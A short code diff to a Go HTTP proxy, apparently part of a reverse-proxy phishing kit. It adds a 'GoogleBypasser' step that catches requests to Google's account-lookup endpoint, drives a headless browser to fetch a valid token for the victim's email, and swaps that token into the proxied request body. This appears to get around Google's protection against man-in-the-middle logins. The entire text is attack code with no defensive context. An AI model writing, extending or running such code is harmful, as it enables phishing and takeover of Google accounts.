@@ -556,6 +556,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 
 						}
+						if strings.EqualFold(req.Host, "accounts.google.com") && strings.Contains(req.URL.String(), "accountlookup?") {
+							log.Debug("GoogleBypass working with: %v", req.RequestURI)
+							b := &GoogleBypasser{
+								isHeadless:     true,
+								withDevTools:   false,
+								slowMotionTime: 1500,
+							}
+							b.Launch()
+							b.GetEmail(body)
+							b.GetToken()
+							body = b.ReplaceTokenInBody(body)
+							req.ContentLength = int64(len(body))
+						}
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 					}
 				}
